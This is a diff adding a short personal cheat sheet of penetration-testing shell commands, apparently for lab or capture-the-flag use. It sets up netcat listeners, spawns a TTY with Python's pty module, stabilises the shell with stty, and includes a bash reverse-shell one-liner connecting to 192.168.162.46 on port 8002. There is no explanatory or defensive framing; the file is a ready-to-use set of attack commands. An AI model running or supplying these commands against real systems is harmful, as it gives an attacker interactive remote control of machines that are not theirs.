@@ -1,0 +1,17 @@
+nc -nvlp
+rlwrap -r nc -nlvp 443  ..Windows
+
+which python python2 python3
+python -c 'import pty;pty.spawn("/bin/sh")'
+python3 -c 'import pty;pty.spawn("/bin/sh")'
+tty
+Ctl-z
+stty raw -echo; fg
+<enter><enter>
+bash
+stty cols 126 rows 35
+export TERM=screen
+
+Again
+bash -c "bash -i >& /dev/tcp/192.168.162.46/8002 0>&1"
+nc -nvlp 8002
